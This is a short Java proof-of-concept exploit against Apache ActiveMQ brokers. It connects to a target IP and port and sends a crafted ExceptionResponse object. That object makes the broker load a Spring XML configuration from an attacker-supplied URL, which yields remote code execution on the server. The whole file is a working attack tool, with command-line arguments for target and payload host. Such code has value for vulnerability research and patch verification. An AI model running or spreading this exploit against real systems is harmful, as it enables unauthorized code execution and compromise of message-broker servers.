package org.example;

import org.apache.activemq.ActiveMQConnection;
import org.apache.activemq.ActiveMQConnectionFactory;
import org.apache.activemq.command.ExceptionResponse;
import org.springframework.context.support.ClassPathXmlApplicationContext;

import javax.jms.ConnectionFactory;
import javax.jms.JMSException;
import java.io.IOException;



public class ExceptionResponsePoc extends Throwable{
    public ExceptionResponsePoc(String test) {
        this.test = test;
    }

    public  String test = "";
    public static void main(String[] args) throws JMSException, IOException {
        String targetip = "127.0.0.1";
        String targetport = "61616";
        String xmlWeb = "http://127.0.0.1:8001/poc";

        // Check if command line arguments are provided
        if (args.length >= 3) {
            targetip = args[0];
            targetport = args[1];
            xmlWeb = args[2];
        }
        else{
            // Print help message
            System.out.println("Usage: java xxx.jar <target_ip> <target_port> <xml_web>");
        }
        System.out.println("  Target IP: " + targetip);
        System.out.println("  Target Port: " + targetport);
        System.out.println("  XML Web: " + xmlWeb);

        String target = "tcp://"+targetip+":"+targetport;

        ConnectionFactory connectionFactory = new ActiveMQConnectionFactory(target);
        ActiveMQConnection connection = (ActiveMQConnection)connectionFactory.createConnection();
        connection.start();

        // 发送一个 ExceptionResponse 给 broker反序列化
        ExceptionResponse message = new ExceptionResponse(new ClassPathXmlApplicationContext(xmlWeb));

//        ExceptionResponse message = new ExceptionResponse(new ClassPathXmlApplicationContext(xmlWeb));

        connection.getTransportChannel().oneway(message);

        connection.close();

    }
}
